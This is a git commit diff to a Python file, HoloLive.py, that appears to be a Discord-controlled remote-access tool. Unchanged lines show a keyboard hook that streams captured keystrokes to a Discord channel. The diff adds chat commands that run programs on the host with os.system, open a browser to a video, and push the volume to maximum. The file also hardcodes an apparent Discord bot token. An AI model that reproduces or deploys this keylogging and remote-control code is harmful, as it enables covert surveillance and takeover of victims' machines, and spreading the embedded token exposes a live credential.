1969aecb061a2b61bc5bf5126f4c46136dcb8f51
Bruno469 <122754415+Bruno469@users.noreply.github.com>
2023-10-20 16:19:49 -0300

    Update HoloLive.py
    Mudei algumas coisas :)

--- HoloLive.py
+++ HoloLive.py
@@ -2,6 +2,9 @@ import keyboard
 import discord
 import os
 import shutil
+from selenium import webdriver
+from time import sleep
+import pyautogui
 
 intents = discord.Intents.all()
 client = discord.Client(intents=intents)
@@ -32,7 +35,21 @@ async def on_message(message):
         keyboard.on_press(on_key_press)
         while True:
             await message.channel.send(f"{key}")
-
+    elif message.content.startswith('!SpawnCalc'):
+        os.system('calc')
+        await message.channel.send('Calculadora executada!')
+    elif message.content.startswith('!SpawnLuan'):
+        driver = webdriver.Edge()
+        driver.get('https://youtu.be/qjjT960FYt4?si=kDPc1Xii6wbQWgxJ')
+        sleep(3)
+        pyautogui.press('Space')
+        await message.channel.send('LuanGamplays!!!!')
+        sleep(15)
+    elif message.content.startswith('!SpawnVolume'):
+        for i in range(70):
+            pyautogui.press('volumeup')
+        await message.channel.send('Volume UP!')
+        
 while connect == False:
     try:
         client.run('MTA2NDYzOTQ4ODI4MzkxODM3Ng.GALGpQ.3l1ztVOcvtL_BfrAy6H7MyalmSOWbr3v5iCgB8')
